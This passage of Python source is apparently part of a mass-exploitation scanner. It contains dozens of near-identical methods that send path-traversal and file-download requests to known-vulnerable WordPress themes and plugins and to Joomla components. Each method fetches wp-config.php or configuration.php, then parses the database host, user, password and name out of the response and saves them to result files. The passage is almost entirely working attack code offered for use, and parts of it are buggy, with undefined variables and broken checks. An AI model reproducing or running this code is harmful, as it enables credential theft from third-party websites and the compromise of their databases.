						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + 'Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}Linenity_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Linenity_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}Linenity_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Lote27_Config(self, url):
		try:
			e = (url+'/wp-content/themes/lote27/download.php?download=../../../wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}Lote27_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + 'Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}Lote27_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Lote27_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}Lote27_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Markant_Config(self, url):
		try:
			e = (url+'/wp-content/themes/markant/download.php?file=../../wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}Markant_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + 'Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}Markant_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Markant_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}Markant_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Michael_Canthony_Config(self, url):
		try:
			e = (url+'/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}Michael_Canthony_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + 'Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}Michael_Canthony_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Michael_Canthony_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}Michael_Canthony_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def NativeChurch_Config(self, url):
		try:
			e = (url+'/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}NativeChurch_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + 'Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}NativeChurch_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}NativeChurch_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}NativeChurch_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Parallelus_Config(self, url):
		try:
			e = (url+'/wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php?file=../../../../../../wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}Parallelus_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + 'Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}Parallelus_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Parallelus_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}Parallelus_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def RedSteel_Config(self, url):
		try:
			e = (url+'/wp-content/themes/RedSteel/download.php?file=../../../wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}RedSteel_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + 'Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}RedSteel_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}RedSteel_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}RedSteel_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def S3bubble_Config(self, url):
		try:
			e = (url+'/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?name=wp-config.php&path=../../../../../../../wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}S3bubble_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + 'Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}S3bubble_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}S3bubble_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}S3bubble_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def SMWF_Config(self, url):
		try:
			e = (url+'/wp-content/themes/SMWF/inc/download.php?file=../wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}SMWF_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + 'Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}SMWF_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}SMWF_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}SMWF_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def TheLoft_Config(self, url):
		try:
			e = (url+'/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php')
			r = requests.get(e, headers=headers)
			if '/** MySQL database username */' and 'DB_PASSWORD' in r.content:
				print('[WordPress] {}{}{} ||{}TheLoft_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/Wordpress.txt', 'a').write(e+'\n')
				try:
					h = re.findall("'DB_HOST', '(.*)'", h.text)
					u = re.findall("'DB_USER', '(.*)'", u.text)
					p = re.findall("'DB_PASSWORD', '(.*)'", p.text)
					d = re.findall("'DB_NAME', '(.*)'", d.text)
					with open('Result/Wordpress.txt', 'a') as c:
						c.write('Host: ' + h[0] + '\n' + 'User: ' + u[0] + '\n' + 'Password: ' + p[0] + '\n' + 'DB: ' + d[0] + '\n\n')
				except:
					print('[WordPress] {}{}{} ||{}TheLoft_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}TheLoft_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[WordPress] {}{}{} ||{}TheLoft_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass

############ Joomla 

	def Hdflvplayer_Config(self, url):
		try:
			e = (url+'/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php')
			r = requests.get(e, headers=headers, verify=False)
			rr = r.text
			if ('JConfig' and '$user' and '$password' and '$host') in rr:
				print('[Joomla] {}{}{} ||{}Hdflvplayer_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				h = "\$host = '(.*?)'"
				u = "\$user = '(.*?)'"
				p = "\$password = '(.*?)'"
				d = "\$db = '(.*?)'"
				ho = re.findall(h, rr)[0]
				us = re.findall(u, rr)[0]
				pa = re.findall(p, rr)[0]
				db = re.findall(db, rr)[0]
				with open('Result/Joomla.txt', 'a') as o:
					o.write(e+'\n')
					o.write('Host: ' + ho + '\n')
					o.write('User: ' + us + '\n')
					o.write('Password: ' + pa + '\n')
					o.write('DB: ' + db + '\n')
			else:
				print('[Joomla] {}{}{} ||{}Hdflvplayer_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[Joomla] {}{}{} ||{}Hdflvplayer_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Cckjseblod_Config(self, url):
		try:
			e = (url+'/index.php?option=com_cckjseblod&task=download&file=configuration.php')
			r = requests.get(e, headers=headers, verify=False)
			rr = r.text
			if ('JConfig' and '$user' and '$password' and '$host') in rr:
				print('[Joomla] {}{}{} ||{}Cckjseblod_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				h = "\$host = '(.*?)'"
				u = "\$user = '(.*?)'"
				p = "\$password = '(.*?)'"
				d = "\$db = '(.*?)'"
				ho = re.findall(h, rr)[0]
				us = re.findall(u, rr)[0]
				pa = re.findall(p, rr)[0]
				db = re.findall(db, rr)[0]
				with open('Result/Joomla.txt', 'a') as o:
					o.write(e+'\n')
					o.write('Host: ' + ho + '\n')
					o.write('User: ' + us + '\n')
					o.write('Password: ' + pa + '\n')
					o.write('DB: ' + db + '\n')
			else:
				print('[Joomla] {}{}{} ||{}Cckjseblod_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[Joomla] {}{}{} ||{}Cckjseblod_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Joomanager_Config(self, url):
		try:
			e = (url+'/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php')
			r = requests.get(e, headers=headers, verify=False)
			rr = r.text
			if ('JConfig' and '$user' and '$password' and '$host') in rr:
				print('[Joomla] {}{}{} ||{}Joomanager_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				h = "\$host = '(.*?)'"
				u = "\$user = '(.*?)'"
				p = "\$password = '(.*?)'"
				d = "\$db = '(.*?)'"
				ho = re.findall(h, rr)[0]
				us = re.findall(u, rr)[0]
				pa = re.findall(p, rr)[0]
				db = re.findall(db, rr)[0]
				with open('Result/Joomla.txt', 'a') as o:
					o.write(e+'\n')
					o.write('Host: ' + ho + '\n')
					o.write('User: ' + us + '\n')
					o.write('Password: ' + pa + '\n')
					o.write('DB: ' + db + '\n')
			else:
				print('[Joomla] {}{}{} ||{}Joomanager_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[Joomla] {}{}{} ||{}Joomanager_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Aceftp_Config(self, url):
		try:
			e = (url+'/administrator/components/com_aceftp/quixplorer/index.php?action=download&dir=&item=configuration.php&order=name&srt=yes')
			r = requests.get(e, headers=headers, verify=False)
			rr = r.text
			if ('JConfig' and '$user' and '$password' and '$host') in rr:
				print('[Joomla] {}{}{} ||{}Aceftp_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				h = "\$host = '(.*?)'"
				u = "\$user = '(.*?)'"
				p = "\$password = '(.*?)'"
				d = "\$db = '(.*?)'"
				ho = re.findall(h, rr)[0]
				us = re.findall(u, rr)[0]
				pa = re.findall(p, rr)[0]
				db = re.findall(db, rr)[0]
				with open('Result/Joomla.txt', 'a') as o:
					o.write(e+'\n')
					o.write('Host: ' + ho + '\n')
					o.write('User: ' + us + '\n')
					o.write('Password: ' + pa + '\n')
					o.write('DB: ' + db + '\n')
			else:
				print('[Joomla] {}{}{} ||{}Aceftp_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[Joomla] {}{}{} ||{}Aceftp_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Jtagmember_Config(self, url):
		try:
			e = (url+'/index.php?option=com_jtagmembersdirectory&task=attachment&download_file=/../../../../configuration.php')
			r = requests.get(e, headers=headers, verify=False)
			rr = r.text
			if ('JConfig' and '$user' and '$password' and '$host') in rr:
				print('[Joomla] {}{}{} ||{}Jtagmember_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				h = "\$host = '(.*?)'"
				u = "\$user = '(.*?)'"
				p = "\$password = '(.*?)'"
				d = "\$db = '(.*?)'"
				ho = re.findall(h, rr)[0]
				us = re.findall(u, rr)[0]
				pa = re.findall(p, rr)[0]
				db = re.findall(db, rr)[0]
				with open('Result/Joomla.txt', 'a') as o:
					o.write(e+'\n')
					o.write('Host: ' + ho + '\n')
					o.write('User: ' + us + '\n')
					o.write('Password: ' + pa + '\n')
					o.write('DB: ' + db + '\n')
			else:
				print('[Joomla] {}{}{} ||{}Jtagmember_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[Joomla] {}{}{} ||{}Jtagmember_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Macgallery_Config(self, url):
		try:
			e = (url+'/index.php?option=com_macgallery&view=download&albumid=../../configuration.php')
			r = requests.get(e, headers=headers, verify=False)
			rr = r.text
			if ('JConfig' and '$user' and '$password' and '$host') in rr:
				print('[Joomla] {}{}{} ||{}Macgallery_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				h = "\$host = '(.*?)'"
				u = "\$user = '(.*?)'"
				p = "\$password = '(.*?)'"
				d = "\$db = '(.*?)'"
				ho = re.findall(h, rr)[0]
				us = re.findall(u, rr)[0]
				pa = re.findall(p, rr)[0]
				db = re.findall(db, rr)[0]
				with open('Result/Joomla.txt', 'a') as o:
					o.write(e+'\n')
					o.write('Host: ' + ho + '\n')
					o.write('User: ' + us + '\n')
					o.write('Password: ' + pa + '\n')
					o.write('DB: ' + db + '\n')
			else:
				print('[Joomla] {}{}{} ||{}Macgallery_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[Joomla] {}{}{} ||{}Macgallery_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def FaceGallery_Config(self, url):
		try:
			e = (url+'/index.php?option=com_facegallery&task=imageDownload&img_name=../../configuration.php')
			r = requests.get(e, headers=headers, verify=False)
			rr = r.text
			if ('JConfig' and '$user' and '$password' and '$host') in rr:
				print('[Joomla] {}{}{} ||{}FaceGallery_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				h = "\$host = '(.*?)'"
				u = "\$user = '(.*?)'"
				p = "\$password = '(.*?)'"
				d = "\$db = '(.*?)'"
				ho = re.findall(h, rr)[0]
				us = re.findall(u, rr)[0]
				pa = re.findall(p, rr)[0]
				db = re.findall(db, rr)[0]
				with open('Result/Joomla.txt', 'a') as o:
					o.write(e+'\n')
					o.write('Host: ' + ho + '\n')
					o.write('User: ' + us + '\n')
					o.write('Password: ' + pa + '\n')
					o.write('DB: ' + db + '\n')
			else:
				print('[Joomla] {}{}{} ||{}FaceGallery_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[Joomla] {}{}{} ||{}FaceGallery_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def S5_Media_Player_Config(self, url):
		try:
			e = (url+'/plugins/content/s5_media_player/helper.php?fileurl=../../../configuration.php')
			r = requests.get(e, headers=headers, verify=False)
			rr = r.text
			if ('JConfig' and '$user' and '$password' and '$host') in rr:
				print('[Joomla] {}{}{} ||{}S5_Media_Player_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				h = "\$host = '(.*?)'"
				u = "\$user = '(.*?)'"
				p = "\$password = '(.*?)'"
				d = "\$db = '(.*?)'"
				ho = re.findall(h, rr)[0]
				us = re.findall(u, rr)[0]
				pa = re.findall(p, rr)[0]
				db = re.findall(db, rr)[0]
				with open('Result/Joomla.txt', 'a') as o:
					o.write(e+'\n')
					o.write('Host: ' + ho + '\n')
					o.write('User: ' + us + '\n')
					o.write('Password: ' + pa + '\n')
					o.write('DB: ' + db + '\n')
			else:
				print('[Joomla] {}{}{} ||{}S5_Media_Player_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[Joomla] {}{}{} ||{}S5_Media_Player_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Docman_Config(self, url):
		try:
			e = (url+'/components/com_docman/dl2.php?archive=0&file=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA==')
			r = requests.get(e, headers=headers, verify=False)
			rr = r.text
			if ('JConfig' and '$user' and '$password' and '$host') in rr:
				print('[Joomla] {}{}{} ||{}Docman_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				h = "\$host = '(.*?)'"
				u = "\$user = '(.*?)'"
				p = "\$password = '(.*?)'"
				d = "\$db = '(.*?)'"
				ho = re.findall(h, rr)[0]
				us = re.findall(u, rr)[0]
				pa = re.findall(p, rr)[0]
				db = re.findall(db, rr)[0]
				with open('Result/Joomla.txt', 'a') as o:
					o.write(e+'\n')
					o.write('Host: ' + ho + '\n')
					o.write('User: ' + us + '\n')
					o.write('Password: ' + pa + '\n')
					o.write('DB: ' + db + '\n')
			else:
				print('[Joomla] {}{}{} ||{}Docman_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[Joomla] {}{}{} ||{}Docman_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Dvfolder_Config(self, url):
		try:
			e = (url+'/modules/mod_dvfoldercontent/download.php?f=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA==')
			r = requests.get(e, headers=headers, verify=False)
			rr = r.text
			if ('JConfig' and '$user' and '$password' and '$host') in rr:
				print('[Joomla] {}{}{} ||{}Dvfolder_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				h = "\$host = '(.*?)'"
				u = "\$user = '(.*?)'"
				p = "\$password = '(.*?)'"
				d = "\$db = '(.*?)'"
				ho = re.findall(h, rr)[0]
				us = re.findall(u, rr)[0]
				pa = re.findall(p, rr)[0]
				db = re.findall(db, rr)[0]
				with open('Result/Joomla.txt', 'a') as o:
					o.write(e+'\n')
					o.write('Host: ' + ho + '\n')
					o.write('User: ' + us + '\n')
					o.write('Password: ' + pa + '\n')
					o.write('DB: ' + db + '\n')
			else:
				print('[Joomla] {}{}{} ||{}Dvfolder_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[Joomla] {}{}{} ||{}Dvfolder_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Addproperty_Config(self, url):
		try:
			e = (url+'/index.php?option=com_addproperty&task=listing&propertyId=73&action=filedownload&fname=../configuration.php')
			r = requests.get(e, headers=headers, verify=False)
			rr = r.text
			if ('JConfig' and '$user' and '$password' and '$host') in rr:
				print('[Joomla] {}{}{} ||{}Addproperty_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				h = "\$host = '(.*?)'"
				u = "\$user = '(.*?)'"
				p = "\$password = '(.*?)'"
				d = "\$db = '(.*?)'"
				ho = re.findall(h, rr)[0]
				us = re.findall(u, rr)[0]
				pa = re.findall(p, rr)[0]
				db = re.findall(db, rr)[0]
				with open('Result/Joomla.txt', 'a') as o:
					o.write(e+'\n')
					o.write('Host: ' + ho + '\n')
					o.write('User: ' + us + '\n')
					o.write('Password: ' + pa + '\n')
					o.write('DB: ' + db + '\n')
			else:
				print('[Joomla] {}{}{} ||{}Addproperty_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[Joomla] {}{}{} ||{}Addproperty_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Contush_Config(self, url):
		try:
			e = (url+'/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php')
			r = requests.get(e, headers=headers, verify=False)
			rr = r.text
			if ('JConfig' and '$user' and '$password' and '$host') in rr:
				print('[Joomla] {}{}{} ||{}Contush_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				h = "\$host = '(.*?)'"
				u = "\$user = '(.*?)'"
				p = "\$password = '(.*?)'"
				d = "\$db = '(.*?)'"
				ho = re.findall(h, rr)[0]
				us = re.findall(u, rr)[0]
				pa = re.findall(p, rr)[0]
				db = re.findall(db, rr)[0]
				with open('Result/Joomla.txt', 'a') as o:
					o.write(e+'\n')
					o.write('Host: ' + ho + '\n')
					o.write('User: ' + us + '\n')
					o.write('Password: ' + pa + '\n')
					o.write('DB: ' + db + '\n')
			else:
				print('[Joomla] {}{}{} ||{}Contush_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[Joomla] {}{}{} ||{}Contush_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Jet_Config(self, url):
		try:
			e = (url+'/index.php?option=com_jetext&task=download&file=../../configuration.php')
			r = requests.get(e, headers=headers, verify=False)
			rr = r.text
			if ('JConfig' and '$user' and '$password' and '$host') in rr:
				print('[Joomla] {}{}{} ||{}Jet_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				h = "\$host = '(.*?)'"
				u = "\$user = '(.*?)'"
				p = "\$password = '(.*?)'"
				d = "\$db = '(.*?)'"
				ho = re.findall(h, rr)[0]
				us = re.findall(u, rr)[0]
				pa = re.findall(p, rr)[0]
				db = re.findall(db, rr)[0]
				with open('Result/Joomla.txt', 'a') as o:
					o.write(e+'\n')
					o.write('Host: ' + ho + '\n')
					o.write('User: ' + us + '\n')
					o.write('Password: ' + pa + '\n')
					o.write('DB: ' + db + '\n')
			else:
				print('[Joomla] {}{}{} ||{}Jet_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[Joomla] {}{}{} ||{}Jet_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Product_Module_Config(self, url):
		try:
			e = (url+'/index.php?option=com_product_modul&task=download&file=../../../../../configuration.php&id=1&Itemid=1')
			r = requests.get(e, headers=headers, verify=False)
			rr = r.text
			if ('JConfig' and '$user' and '$password' and '$host') in rr:
				print('[Joomla] {}{}{} ||{}Product_Module_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				h = "\$host = '(.*?)'"
				u = "\$user = '(.*?)'"
				p = "\$password = '(.*?)'"
				d = "\$db = '(.*?)'"
				ho = re.findall(h, rr)[0]
				us = re.findall(u, rr)[0]
				pa = re.findall(p, rr)[0]
				db = re.findall(db, rr)[0]
				with open('Result/Joomla.txt', 'a') as o:
					o.write(e+'\n')
					o.write('Host: ' + ho + '\n')
					o.write('User: ' + us + '\n')
					o.write('Password: ' + pa + '\n')
					o.write('DB: ' + db + '\n')
			else:
				print('[Joomla] {}{}{} ||{}Product_Module_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[Joomla] {}{}{} ||{}Product_Module_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def WD_Config(self, url):
		try:
			e = (url+'/plugins/content/wd/wddownload.php?download=wddownload.php&file=../../../configuration.php')
			r = requests.get(e, headers=headers, verify=False)
			rr = r.text
			if ('JConfig' and '$user' and '$password' and '$host') in rr:
				print('[Joomla] {}{}{} ||{}WD_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				h = "\$host = '(.*?)'"
				u = "\$user = '(.*?)'"
				p = "\$password = '(.*?)'"
				d = "\$db = '(.*?)'"
				ho = re.findall(h, rr)[0]
				us = re.findall(u, rr)[0]
				pa = re.findall(p, rr)[0]
				db = re.findall(db, rr)[0]
				with open('Result/Joomla.txt', 'a') as o:
					o.write(e+'\n')
					o.write('Host: ' + ho + '\n')
					o.write('User: ' + us + '\n')
					o.write('Password: ' + pa + '\n')
					o.write('DB: ' + db + '\n')
			else:
				print('[Joomla] {}{}{} ||{}WD_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			print('[Joomla] {}{}{} ||{}WD_Config{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			pass
	def Jat3_Config(self, url):
		try:
			e = (url+'/index.php?jat3action=gzip&type=css&file=configuration.php')
			r = requests.get(e, headers=headers, verify=False)
			rr = r.text
			if ('JConfig' and '$user' and '$password' and '$host') in rr:
				print('[Joomla] {}{}{} ||{}Jat3_Config{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				h = "\$host = '(.*?)'"
				u = "\$user = '(.*?)'"
				p = "\$password = '(.*?)'"
				d = "\$db = '(.*?)'"
				ho = re.findall(h, rr)[0]
				us = re.findall(u, rr)[0]
				pa = re.findall(p, rr)[0]
				db = re.findall(db, rr)[0]
				with open('Result/Joomla.txt', 'a') as o:
					o.write(e+'\n')
